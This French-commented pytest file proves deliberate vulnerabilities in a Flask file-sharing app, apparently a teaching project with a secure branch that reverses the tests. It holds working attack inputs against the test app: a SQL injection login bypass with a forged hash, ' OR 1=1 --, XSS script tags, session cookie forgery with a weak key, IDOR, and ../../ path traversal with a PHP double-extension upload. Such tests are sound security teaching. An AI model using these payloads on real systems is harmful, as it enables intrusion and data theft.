"""PREUVES des vulnérabilités volontaires de la version 1 (voir docs/VULNERABILITES_VOLONTAIRES.md).

Chaque test réussit parce que l'attaque FONCTIONNE sur la version vulnérable.
Dans la branche `secure`, ces tests sont inversés : l'attaque doit échouer (tests de non-régression).
"""
import io

import bcrypt

from .conftest import PASSWORD, db, login, register, upload


def test_VULN01_sql_injection_login_union_forges_a_user_row(app, alice):
    forged_hash = bcrypt.hashpw(b"attaquant", bcrypt.gensalt(4)).decode()
    attacker = app.test_client()
    payload = f"x' UNION SELECT 1, 'alice', '{forged_hash}' --"
    resp = attacker.post("/login", data={"username": payload, "password": "attaquant"})
    assert resp.status_code == 302                     # connecté comme alice sans connaître son mot de passe
    assert attacker.get("/").status_code == 200


def test_VULN01_sql_error_is_leaked(app):
    resp = app.test_client().post("/login", data={"username": "'", "password": "x"})
    assert "Erreur SQL" in resp.get_data(as_text=True)


def test_VULN02_sql_injection_search_bypasses_owner_filter(app, alice, bob):
    upload(alice, "secret_alice.txt")
    page = bob.get("/search", query_string={"q": "' OR 1=1 --"}).get_data(as_text=True)
    assert "secret_alice.txt" in page                  # Bob voit les fichiers d'Alice


def test_VULN03_stored_xss_in_filename(app, alice):
    name = "<script>alert('xss')</script>.txt"
    upload(alice, name)
    assert name in alice.get("/").get_data(as_text=True)


def test_VULN04_reflected_xss_in_search(app, alice):
    page = alice.get("/search", query_string={"q": "<script>alert(1)</script>"}).get_data(as_text=True)
    assert "<script>alert(1)</script>" in page


def test_VULN05_csrf_state_change_through_get_without_token(app, alice, bob):
    fid = upload(alice)
    assert alice.get(f"/share/{fid}", query_string={"to": "bob"}).status_code == 302   # un simple lien suffit
    assert b"contrat.pdf" in bob.get("/").data
    assert alice.get(f"/delete/{fid}").status_code == 302                                # suppression par lien


def test_VULN06_idor_download_other_users_file(app, alice, bob):
    secret = b"document prive d'Alice"
    fid = upload(alice, "prive.pdf", secret)
    assert bob.get(f"/download/{fid}").data == secret   # aucun partage, pourtant accès accordé
    assert b"prive.pdf" in bob.get(f"/file/{fid}").data


def test_VULN06_idor_bob_can_delete_and_share_alices_file(app, alice, bob):
    fid = upload(alice)
    assert bob.get(f"/share/{fid}", query_string={"to": "bob"}).status_code == 302
    assert bob.get(f"/delete/{fid}").status_code == 302
    assert db(app).execute("SELECT 1 FROM files WHERE id = ?", (fid,)).fetchone() is None


def test_VULN07_session_cookie_not_httponly_and_replayable_after_logout(app, alice):
    resp = app.test_client().post("/login", data={"username": "alice", "password": PASSWORD})
    cookie_header = resp.headers.get("Set-Cookie", "")
    assert "HttpOnly" not in cookie_header
    client = app.test_client()
    client.post("/login", data={"username": "alice", "password": PASSWORD})
    stolen = client.get_cookie("session").value
    client.get("/logout")
    assert client.get("/").status_code == 302          # déconnecté pour le navigateur légitime...
    thief = app.test_client()
    thief.set_cookie("session", stolen)
    assert thief.get("/").status_code == 200           # ...mais l'ancien cookie fonctionne encore


def test_VULN07_weak_secret_key_allows_cookie_forgery(app):
    from flask.sessions import SecureCookieSessionInterface
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)   # SECRET_KEY = "dev"
    forged = serializer.dumps({"user_id": 1, "username": "alice"})
    client = app.test_client()
    client.set_cookie("session", forged)
    register(app.test_client(), "alice")
    assert client.get("/").status_code == 200


def test_VULN08_no_rate_limit_and_user_enumeration(app, alice):
    attacker = app.test_client()
    for _ in range(12):
        assert "Mot de passe incorrect" in attacker.post(
            "/login", data={"username": "alice", "password": "faux"}).get_data(as_text=True)
    assert "Utilisateur inconnu" in attacker.post("/login", data={"username": "zzz", "password": "x"}).get_data(as_text=True)
    assert attacker.post("/login", data={"username": "alice", "password": PASSWORD}).status_code == 302  # jamais bloqué


def test_VULN09_upload_accepts_dangerous_names_and_path_traversal(app, alice):
    upload(alice, "shell.php.jpg", b"<?php echo 1; ?>")             # double extension acceptée
    upload(alice, "../../evasion.bin", b"fichier ecrit hors de storage/")
    assert (app.tmp_path / "evasion.bin").exists()                  # écrit en dehors du dossier de stockage


def test_VULN10_no_security_headers(app, alice):
    headers = alice.get("/").headers
    assert "Content-Security-Policy" not in headers and "X-Content-Type-Options" not in headers
